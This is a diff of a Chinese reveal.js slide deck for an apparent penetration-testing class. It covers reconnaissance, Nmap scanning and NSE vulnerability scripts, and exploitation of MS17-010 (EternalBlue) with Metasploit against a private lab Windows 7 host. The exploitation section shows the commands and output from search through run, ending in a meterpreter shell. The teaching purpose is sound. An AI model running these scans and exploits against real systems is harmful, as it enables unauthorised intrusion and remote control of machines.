@@ -36,7 +36,8 @@
                 
                 <section>
                     <section>
-                        <h3>簽到表單</h3>
+                        <h3><a href="https://forms.gle/c132ZQSQ2QJMUzav9" target="_blank"> 前測表單</a></h3>
+                        <img src="./media/3.png" width="40%" height="40%" alt="https://forms.gle/c132ZQSQ2QJMUzav9">
                     </section>
                     
                     <section data-auto-animate>
@@ -71,7 +72,7 @@
                 <section>
                     <section>
                         <div style="font-size: 2em; font-weight: 600;">滲透測試</div>
-                        <h4>Penetration Test (Pentest)</h4>
+                        <h4>Penetration Test (PenTest)</h4>
                     </section>
                     <section>
                         <div style="font-size: 1.3em; font-weight: 600;"> 以黑帽駭客的思維與手法</div>
@@ -79,18 +80,18 @@
                         <p><ul>
                             <li class="fragment"><p><h4> 設備安全 </h4></p></li>
                             <li class="fragment"><p><h4> 網頁安全 </h4></p></li>
-                            <li class="fragment"><p><h4> 網站安全 </h4></p></li>
+                            <li class="fragment"><p><h4> 網路安全 </h4></p></li>
                         </ul></p>
                     </section>
                     <section data-auto-animate>
-                        <div data-id="web" style="font-size: 1.4em; font-weight: 600;">網站安全</div>
+                        <div data-id="web" style="font-size: 1.4em; font-weight: 600;">網路安全</div>
                         <div class="fragment"><p>
                             <h5>整個網路系統，包含 www 服務以及以外的服務，</h5>
                             <h5>例如 ftp、ssh、snmp 等等</h5>
                             </p></p></div>
                     </section>
                     <section data-auto-animate>
-                        <div data-id="web" style="font-size: 1.4em; font-weight: 600;">網站安全</div>
+                        <div data-id="web" style="font-size: 1.4em; font-weight: 600;">網路安全檢測</div>
                         <div>
                             <p><ul>
                                 <li><p><h4> VPN </h4></p></li>
@@ -111,7 +112,6 @@
                         <div class="fragment"><p><ul>
                             <li><p><h4> 確認標的 </h4></p></li>
                             <li><p><h4> 偵查 </h4></p></li>
-                            <li><p><h4> 掃描 </h4></p></li>
                             <li><p><h4> 弱點利用 </h4></p></li>
                             <li><p><h4> 檢測報告 </h4></p></li>
                             </ul></p><div>
@@ -120,8 +120,7 @@
                         <div data-id="sop" style="font-size: 1.4em; font-weight: 600;">檢測流程</div>
                         <p><ul>
                             <li style="color: #515050;"><p><h4 style="color: #515050;"> 確認標的 </h4></p></li>
-                            <li style="color: #515050;"><p><h4 style="color: #515050;"> 偵查 </h4></p></li>
-                            <li style="color: #FFFEF9;"><p><h4 style="color: #FFFEF9;"> 掃描 </h4></p></li>
+                            <li style="color: #FFFEF9;"><p><h4 style="color: #FFFEF9;"> 偵查 </h4></p></li>
                             <li style="color: #FFFEF9;"><p><h4 style="color: #FFFEF9;"> 弱點利用 </h4></p></li>
                             <li style="color: #515050;"><p><h4 style="color: #515050;"> 檢測報告 </h4></p></li>
                         </ul></p>
@@ -153,7 +152,7 @@
                         <h3>kali</h3>
                         <p><ul>
                             <li class="fragment"><p><h4> Linux 系統 </h4></p></li>
-                            <li class="fragment"><p><h4> 500 多種資安工具 </h4></p></li>
+                            <li class="fragment"><p><h4> 600 多種資安工具 </h4></p></li>
                             <li class="fragment"><p><h4><a href="https://www.kali.org/tools/" target="_blank">參考資料</a></h4></p></li>
                         </ul></p>
                     </section>
@@ -212,41 +211,62 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
                         <div data-id="target" style="font-size: 72px; font-weight: 600;">偵查</div>
                     </section>
                     <section data-auto-animate>
-                        <div data-id="target" style="font-size: 56px; font-weight: 600;">偵查</div>
+                        <div data-id="target" style="font-size: 72px; font-weight: 600;">偵查</div>
                         <p><ul>
-                            <li class="fragment"><p><h4> 不接觸目標為主 </h4></p></li>
                             <div class="fragment">
-                                <li><p><h4> Google hacking </h4></p></li>
-                                <li><p><h4> site logic </h4></p></li>
-                                <li><p><h4> 其他公開情報</h4></p></li>
+                                <li><p><h4> 被動偵查 </h4></p></li>
+                                <li><p><h4> 主動偵查 </h4></p></li>
                             </div>
                         </ul></p>
                     </section>
-                </section>
-
-                <section>
                     <section data-auto-animate>
-                        <div data-id="target2" style="font-size: 72px; font-weight: 600;">掃描</div>
+                        <div data-id="pass" style="font-size: 56px; font-weight: 600;">被動偵查</div>
+                            <p><h4 class="fragment"> 不主動向目標發送封包(不接觸)，以收集公開情報為原則，例如</h4></p>
+                            <div class="fragment">
+                                <p><ul>
+                                <li><p><h4><a href="https://myip.ms/info/whois/185.199.108.153/k/3015304041/website/autooong.github.io" target="_blank"> IP、域名、主機名 </a></h4></p></li>
+                                <li><p><h4><a href="https://www.nslookup.io/domains/autooong.github.io/dns-records/" target="_blank"> DNS </a></h4></p></li>
+                                <li><p><h4><a href="https://zeroday.hitcon.org/vulnerability/disclosed" target="_blank"> 曾被通報的洞 </a></h4></p></li>
+                                <li><p><h4><a href="https://web.archive.org/web/20051125145453/http://www.fcu.edu.tw/main/faculty/faculty_index.htm" target="_blank"> 網頁的歷史紀錄 </a></h4></p></li>
+                                <li><p><h4><a href="https://www.shodan.io/dashboard" target="_blank"> Shodan </a></h4></p></li>
+                                <li><p><h4><a href="https://www.exploit-db.com/google-hacking-database" target="_blank"> Google Hacking </a></h4></p></li>
+                                </ul></p>
+                            </div>
                     </section>
-                    <section data-auto-animate>
-                        <div data-id="target2" style="font-size: 56px; font-weight: 600;">掃描</div>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">主動偵查</div>
+                        <p><h4> 會主動接觸目標，通常以掃描的方式 </h4></p>
                         <p><ul>
                             <div class="fragment">
                                 <li><p><h4><a href="https://www.kali.org/tools/zaproxy/" target="_blank"> OWASP ZAP </a></h4></p></li>
                                 <li><p><h4><a href="https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux" target="_blank"> Nessus </a></h4></p></li>
                             </div>
-                            <li class="fragment"><p><h4> Nmap </h4></p></li>
+                            <li class="fragment"><p><h4><a href="https://nmap.org/book/intro.html" target="_blank"> Nmap </a></h4></p></li>
                         </ul></p>
                     </section>
                     <section>
                         <div data-id="target2" style="font-size: 56px; font-weight: 600;">Nmap</div>
                         <p><h5 class="fragment">port scanner，由回傳的 banner 判定 port 狀態</h5></p>
                     </section>
-                    <section>
-                        <h4>nmap [Options] {target specification}</h4>    
+                    <section data-auto-animate>
+                        <h4 data-id="nmapoption">nmap [Options] {target}</h4>    
+                    </section>
+                    <section data-auto-animate>
+                        <h4 data-id="nmapoption">nmap <span style="color: #a23">[Options]</span> {target}</h4>    
+                        <p><ul>
+                            <li class="fragment"><p><h4> nmap 192.168.92.129 </h4></p></li>
+                            <li class="fragment"><p><h4> nmap <span style="color: #a23">-Pn</span> 192.168.92.129 </h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section data-auto-animate>
+                        <h4 data-id="nmapoption">nmap [Options] <span style="color: #a23">{target}</span></h4>    
+                        <p><ul>
+                            <li><p><h4> nmap <span style="color: #a23">192.168.92.129</span> </h4></p></li>
+                            <li><p><h4> nmap -Pn <span style="color: #a23">192.168.92.129</span> </h4></p></li>
+                        </ul></p>
                     </section>
                     <section>
-                        <div style="font-size: 56px; font-weight: 600;">參數</div>
+                        <div style="font-size: 56px; font-weight: 600;">Options</div>
                         <p>
                         <table>
                             <thead>
@@ -273,37 +293,192 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
                         </p>
                     </section>
                     <section>
-                        <div style="font-size: 56px; font-weight: 600;">-Pn</div>
+                        <div style="font-size: 56px; font-weight: 600;">Options: -Pn</div>
                         <p><ul>
                             <li class="fragment"><p><h4> P：發送 ICMP 封包</h4></p></li>
                             <li class="fragment"><p><h4> Windows 會擋</h4></p></li>
                         </ul></p>
                     </section>
                     <section>
-                        <div style="font-size: 56px; font-weight: 600;">-sS</div>
+                        <div style="font-size: 56px; font-weight: 600;">Options: -sS</div>
                     </section>
                     <section>
-                        <div style="font-size: 56px; font-weight: 600;">-p</div>
+                        <div style="font-size: 56px; font-weight: 600;">TCP 三向交握</div>
+                        <ul>
+                            <h3 class="fragment" style="white-space: pre;"><span style="position: relative; left: -13px;"><span style="color: #a23">A</span>                               <span style="color: #2B6DF0">B</span></span></h3>
+                        <br>
+                        <h4 class="fragment" style="white-space: pre;"><span style="color: #a23"> <span style="position: relative; top: -17px;">________</span>SYN<span style="position: relative; top: -17px;">________</span><span style="position: relative; left: -19px;">></span></span></h4>
+                        <br>
+                        <h4 class="fragment" style="white-space: pre;"><span style="color: #2B6DF0">          <span style="position: relative; right: -19px;"><</span><span style="position: relative; top: -17px;">______</span>ACK,SYN<span style="position: relative; top: -17px;">______</span></span></h4>
+                        <br>
+                        <h4 class="fragment" style="white-space: pre;"><span style="color: #a23"> <span style="position: relative; top: -17px;">________</span>ACK<span style="position: relative; top: -17px;">________</span><span style="position: relative; left: -19px;">></span></span></h4>
+                        <br>
+                        </ul> 
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">Options: -sS</div>
                         <p><ul>
-                            <li><p><h4> -p21 </h4></p></li>
-                            <li><p><h4> -p21,443 </h4></p></li>
-                            <li><p><h4> -p20-80 </h4></p></li>
-                            <li><p><h4> -p-</h4></p></li>
+                            <li class="fragment"><p><h4> 只發送第一步 SYN 封包</h4></p></li>
+                            <li class="fragment"><p><h4> 隱匿性較高</h4></p></li>
+                            <li class="fragment"><p><h4> 需要用 sudo </h4></p></li>
                         </ul></p>
                     </section>
                     <section>
-                        <div style="font-size: 56px; font-weight: 600;">smb：port445</div>
-                        <h4>用於文件共享的協議</h4>    
+                        <div style="font-size: 56px; font-weight: 600;">Options: -p</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4> -p21 </h4></p></li>
+                            <li class="fragment"><p><h4> -p21,443 </h4></p></li>
+                            <li class="fragment"><p><h4> -p20-80 </h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">target: IP</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4> 192.168.92.129 </h4></p></li>
+                            <li class="fragment"><p><h4> 192.168.92.129-135 </h4></p></li>
+                            <li class="fragment"><p><h4> 192.168.92.135/24 </h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section data-auto-animate>
+                        <pre data-id="nmap1"><code data-line-numbers="1-6|1,5">Nmap scan report for 192.168.92.XX
+Host is up (0.016s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:85:79:94 (VMware)</code></pre>
+                    </section>
+                    <section data-auto-animate>
+                        <p><h4>sudo nmap -Pn -sS 192.168.92.135/24</h4></p>
+                        <pre data-id="nmap1"><code data-line-numbers="1,2,4,8">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -Pn -sS 192.168.92.130/24 
+...
+Nmap scan report for 192.168.92.129
+Host is up (0.016s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:85:79:94 (VMware)
+...</code></pre>
+                    </section>
+                    <section data-auto-animate>
+                        <p><h3>確認 IP 後 ... 再詳細一點</h3></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">掃描全部的 port</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4> -p1-65535 </h4></p></li>
+                            <li class="fragment"><p><h4> -p-</h4></p></li>
+                        </ul></p>
                     </section>
                     <section>
                         <div style="font-size: 56px; font-weight: 600;">NSE</div>
                         <p><ul>
-                            <li><p><h4> nmap 的 script</h4></p></li>
-                            <li><p><h4><a href="https://www.infosecmatter.com/nmap-nse-library/" target="_blank"> 參考資料</a></h4></p></li>
+                            <li class="fragment"><p><h4> nmap 的 script</h4></p></li>
+                            <li class="fragment"><p><h4> 位置通常在：nmap/scripts</h4></p></li>
+                            <li class="fragment"><p><h4> 依功能分成 14 種類別</h4></p></li>
+                            <li class="fragment"><p><h4> 不是每種都常用，如 DoS</h4></p></li>
+                            <li class="fragment"><p><h4><a href="https://www.infosecmatter.com/nmap-nse-library/" target="_blank"> 參考資料</a></h4></p></li>
                         </ul></p>
                     </section>
                     <section>
-                        <p><pre style="font-size: 27px"><code>nmap -Pn -p445 --script smb-vuln-ms17-010 192.168.92.132</code></pre></p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>類別</th>
+                                    <th>說明</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>default</td>
+                                    <td>基本的訊息收集、漏洞掃描</td>
+                                </tr>
+                                <tr>
+                                    <td>discovery</td>
+                                    <td>從公開資訊獲取資訊，如網頁根目錄</td>
+                                </tr>
+                                <tr>
+                                    <td>vuln</td>
+                                    <td>驗證是否存在漏洞</td>
+                                </tr>
+                                <tr>
+                                    <td>exploit</td>
+                                    <td>利用漏洞，最好使用同時帶有 safe 的</td>
+                                </tr>
+                                <tr>
+                                    <td>safe</td>
+                                    <td>不會破壞目標、不消耗大量資源</td>
+                                </tr>
+                                <tr>
+                                    <td>malware</td>
+                                    <td>檢測目標是否感染已知惡意程式</td>
+                                </tr>
+                                <tr>
+                                    <td>version</td>
+                                    <td>版本檢測</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">NSE 用法</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4> 加上參數 --script <名稱>|<種類></h4></p></li>
+                            <pre class="fragment"><code>nmap --script safe 192.168.92.139</code></pre>
+                            <li class="fragment"><p><h4> 如果 script 需要參數，--script-args</h4></p></li>
+                            <pre class="fragment"><code>nmap --script default --script-args "timeout=250"</code></pre>
+                            <pre style="font-size: 18px" class="fragment"><code>nmap --script default --script-args "broadcast-ping.timeout=250"</code></pre>
+                            <li class="fragment"><p><h4> --script default 等同於 -sC</h4></p></li>
+                            <li class="fragment"><p><h4> 若同時 default、version 則 -sCV</h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <h4>sudo nmap -Pn -p- -sSCV YOUR.IP</h4>
+                        <pre style="font-size: 20px" class="fragment"><code>$ sudo nmap -Pn -p- -sSCV 192.168.92.139 
+Host script results:
+| smb2-time: 
+|_  :
+| smb2-security-mode: 
+|_  :
+| smb-security-mode: 
+|_  :
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: WIN-TT6NI6NJQ6V
+|   NetBIOS computer name: WIN-TT6NI6NJQ6V\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-04-20T06:57:19+08:00
+|_clock-skew: mean: -2h39m58s, deviation: 4h37m05s, median: 0s
+</code></pre>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">smb：port445</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4>Windows 系統的標準協議</h4></p></li>
+                            <li class="fragment"><p><h4>用於文件、印表機共享</h4></p></li>
+                            <li class="fragment"><p><h4>其他作業系統可做為客戶端運行</h4></p></li>
+                            <li class="fragment"><p><h4>samba 實現 Windows 與 Linux 共享</h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">vuln：驗證是否存在漏洞</div>
+                        <div class="fragment"><p><h4>nmap -Pn --script vuln YOUR.IP</h4></p></div>
+                        <pre style="font-size: 18px" class="fragment"><code data-line-numbers="3-10">$ nmap -Pn --script vuln 192.168.92.139 
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|_       servers (ms17-010).
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+</code></pre>
                     </section>
                 </section>
                     
@@ -312,21 +487,272 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
                         <div data-id="target" style="font-size: 72px; font-weight: 600;">弱點利用</div>
                     </section>
                     <section>
-                        <div style="font-size: 56px; font-weight: 600;">永恆之藍(EternalBlue)</div>
+                        <div style="font-size: 56px; font-weight: 600;">ms17-010</div>
                         <p><ul>
-                            <li><p><h4>Windows SMB</h4></p></li>
-                            <li><p><h4>file extended attributes(FEA)</h4></p></li>
-                            <li><p><h4>轉為 NTFEA</h4></p></li>
+                            <li class="fragment"><p><h4>永恆之藍(EternalBlue)</h4></p></li>
+                            <li class="fragment"><p><h4>三個 SMB 程式漏洞組成</h4></p></li>
                         </ul></p>
                     </section>
                     <section>
-                        <div style="font-size: 56px; font-weight: 600;">metasploit</div>
+                        <div style="font-size: 56px; font-weight: 600;">Bug 1 & 2</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4>SMB：共享文件</h4></p></li>
+                            <li class="fragment"><p><h4>file extended attributes(FEA)</h4></p></li>
+                            <li class="fragment"><p><h4>轉為 NTFEA 發生緩衝區溢出</h4></p></li>
+                            <li class="fragment"><p><h4>可操作記憶體到想要的位址</h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">Bug 3</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4>使用者驗證機制</h4></p></li>
+                            <li class="fragment"><p><h4>可隨意寫入資料到記憶體</h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <p><ul>
+                            <li class="fragment"><p><h4>Bug 1 & 2 + Bug 3 = 永恆之藍</h4></p></li>
+                            <li class="fragment"><p><h4>Remote Code Execution (RCE)</h4></p></li>
+                        </ul></p>
+                        <br>
+                        <div class="fragment" style="font-size: 56px; font-weight: 600;">如何利用？</div>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">Payload</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4>可執行想要目的的惡意程式</h4></p></li>
+                            <li class="fragment"><p><h4>利用此拿到靶機的控制權</h4></p></li>
+                            <li class="fragment"><p><h4>開啟雙方 port 讓靶機和攻擊機連線</h4></p></li>
+                            <li class="fragment"><p><h4>靶機把 shell 的控制權交給攻擊機</h4></p></li>
+                            <li class="fragment"><p><h4>reverse shell</h4></p></li>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">Metasploit</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4>漏洞測試與攻擊框架</h4></p></li>
+                            <li class="fragment"><p><h4>攻擊工具開發(Ruby)、漏洞檢測與利用</h4></p></li>
+                            <li class="fragment"><p><h4><a href="https://docs.metasploit.com/docs/using-metasploit/basics/" target="_blank">參考資料</a></h4></p></li>
+
+                        </ul></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">Metasploit 用法</div>
+                        <p><ol>
+                            <li class="fragment"><p><h4>搜尋漏洞利用工具</h4></p></li>
+                            <li class="fragment"><p><h4>選擇工具</h4></p></li>
+                            <li class="fragment"><p><h4>確認參數</h4></p></li>
+                            <li class="fragment"><p><h4>輸入參數</h4></p></li>
+                            <li class="fragment"><p><h4>執行</h4></p></li>
+                        </ol></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">0. 執行：msfconsole</div>
+                        <pre style="font-size: 14px" class="fragment"><code>                                       Trace program: running
+
+                                           wake up, Neo...                                                   
+                                        the matrix has you                                                   
+                                      follow the white rabbit.
+
+                                          knock, knock, Neo.
+
+                                                        (`.         ,-,
+                                                        ` `.    ,;' /
+                                                         `.  ,'/ .'
+                                                          `. X /.'
+                                                .-;--''--.._` ` (
+                                              .'            /   `
+                                             ,           ` '   Q '
+                                             ,         ,   `._    \
+                                          ,.|         '     `-.;_'
+                                          :  . `  ;    `  ` --,.._;
+                                           ' `    ,   )   .'
+                                              `._ ,  '   /_
+                                                 ; ,''-,;' ``-
+                                                  ``-..__``--`</code></pre>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">1. 搜尋漏洞利用工具</div>
+                        <div class="fragment"><p><h4>search ms17-010</h4></p></div>
+                        <pre class="fragment"><code data-line-numbers="1-11|5,7,8,11">msf6 > search ms17-010
+                        
+Matching Modules
+================
+   #  Name                                        Rank     Check
+   -  ----                                        ----     -----
+   0  exploit/windows/smb/ms17_010_eternalblue    average   Yes   
+   1  exploit/windows/smb/ms17_010_psexec         normal    Yes
+   2  auxiliary/admin/smb/ms17_010_command        normal    No    
+   3  auxiliary/scanner/smb/smb_ms17_010          normal    No     
+   4  exploit/windows/smb/smb_doublepulsar_rce    great     Yes
+
+</code></pre>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">Rank</div>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>名稱</th>
+                                    <th>說明</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Excellent</td>
+                                    <td>保證不會把靶機打爛</td>
+                                </tr>
+                                <tr>
+                                    <td>Great</td>
+                                    <td>依照軟體版本調整目標，成功率較高</td>
+                                </tr>
+                                <tr>
+                                    <td>Good</td>
+                                    <td>依照軟體種類調整目標</td>
+                                </tr>
+                                <tr>
+                                    <td>Normal</td>
+                                    <td>成功率穩定</td>
+                                </tr>
+                                <tr>
+                                    <td>Average</td>
+                                    <td>成功率不穩定(50% 以上)</td>
+                                </tr>
+                                <tr>
+                                    <td>Low</td>
+                                    <td>成功率不穩定(50% 以下)</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </section>
+                    <section data-auto-animate>
+                        <div data-id="msftool" style="font-size: 56px; font-weight: 600;">2. 選擇工具</div>
+                        <div class="fragment"><p><h4>use 1</h4></p></div>
+                        <pre class="fragment"><code style="font-size: 14px" data-line-numbers="1-12|1|6|11-12|">msf6 exploit(windows/smb/ms17_010_psexec) > check
+
+[*] 192.168.92.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.92.139:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1
+[*] 192.168.92.139:445 - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.92.139:445 - The target is vulnerable.
+msf6 exploit(windows/smb/ms17_010_psexec) > run
+
+[*] Started reverse TCP handler on 192.168.92.135:4444 
+[*] 192.168.92.139:445 - Target OS: Windows 7 Home Basic 7601 Service Pack 1
+[-] 192.168.92.139:445 - Unable to find accessible named pipe!
+[*] Exploit completed, but no session was created.
+</code></pre>
+                    </section>
+                    <section data-auto-animate>
+                        <div data-id="msftool" style="font-size: 56px; font-weight: 600;">2. 選擇工具</div>
+                        <div class="fragment"><p><h4>use 4</h4></p></div>
+                        <pre class="fragment"><code style="font-size: 20px" data-line-numbers="1-5|1,5">msf6 exploit(windows/smb/smb_doublepulsar_rce) > check
+
+[*] 192.168.92.139:445 - Sending ping to DOUBLEPULSAR
+[-] 192.168.92.139:445 - DOUBLEPULSAR not detected or disabled
+[*] 192.168.92.139:445 - The target is not exploitable.
+</code></pre>
+                        <br>
+                        <div class="fragment" style="font-size: 56px; font-weight: 600;">因此選擇編號 0：use 0</div>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">3. 確認參數</div>
+                        <div class="fragment"><p><h4>show options</h4></p></div>
+                        <pre class="fragment"><code style="font-size: 22px" data-line-numbers="1|3-13|16-22|7">msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required 
+   ----           ---------------  --------
+   RHOSTS                          yes       
+   RPORT          445              yes      
+   SMBDomain                       no        
+   SMBPass                         no       
+   SMBUser                         no       
+   VERIFY_ARCH    true             yes       
+   VERIFY_TARGET  true             yes       
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  
+   ----      ---------------  --------
+   EXITFUNC  thread           yes       
+   LHOST     192.168.92.135   yes       
+   LPORT     4444             yes 
+
+
+
+
+</code></pre>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">4. 輸入參數</div>
+                        <div class="fragment"><p><h4>set</h4></p></div>
+                        <pre class="fragment"><code style="font-size: 20px" data-line-numbers="">msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.92.139
+RHOSTS => 192.168.92.139
+</code></pre>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">5. 執行</div>
+                        <div class="fragment"><p><h4>check</h4></p></div>
+                        <pre class="fragment"><code style="font-size: 14px" data-line-numbers="1-6|6">msf6 exploit(windows/smb/ms17_010_eternalblue) > check
+
+[*] 192.168.92.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.92.139:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1
+[*] 192.168.92.139:445 - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.92.139:445 - The target is vulnerable.
+</code></pre>
+                        <div class="fragment"><p><h4>run</h4></p></div>
+                        <pre class="fragment"><code style="font-size: 20px" data-line-numbers="">msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+:
+meterpreter > pwd
+C:\Windows\system32
+</code></pre>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">取得 RCE 之後...?</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4>後滲透</h4></p></li>
+                            <div class="fragment">
+                            <li><p><h4>提權</h4></p></li>
+                            <li><p><h4>橫向移動</h4></p></li>
+                            </div>
+                        </ul></p>
                     </section>
                 </section>
 
                 <section>
                     <section data-auto-animate>
                         <div data-id="target" style="font-size: 72px; font-weight: 600;">檢測報告</div>
+                    </section>
+                    <section data-auto-animate>
+                        <div data-id="target" style="font-size: 56px; font-weight: 600;">檢測報告</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4> 依公司會有不同的模板 </h4></p></li>
+                            <div class="fragment">
+                                <li><p><h4> 給資安人員看的：整體漏洞情況 & 分布 </h4></p></li>
+                                <li><p><h4> 給工程師看的：漏洞細節 & 修復建議 </h4></p></li>
+                                <li><p><h4> 給主管級別看的：整體漏洞總結</h4></p></li>
+                            </div>
+                        </ul></p>
+                    </section>
+                    <section>
+                        <div style="font-size: 56px; font-weight: 600;">memo</div>
+                        <p><ul>
+                            <li class="fragment"><p><h4> 檢測者不一定負責報告撰寫 </h4></p></li>
+                            <li class="fragment"><p><h4> 每一步都要截圖 </h4></p></li>
+                            <li class="fragment"><p><h4> 過程要詳細 </h4></p></li>
+                            <div class="fragment">
+                                <li><p><h4> 截圖工具：<a href="https://picpick.app/zh-tw/" target="_blank">PicPick</a></h4></p></li>
+                                <li><p><h4> 筆記工具：Microsoft OneNote</h4></p></li>
+                            </div>
+                        </ul></p>
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h3><a href="https://forms.gle/5ZHkrrsKtHkPuMfX7" target="_blank"> 後測表單</a></h3>
+                        <img src="./media/4.png" width="40%" height="40%" alt="https://forms.gle/5ZHkrrsKtHkPuMfX7">
                     </section>
                 </section>
 
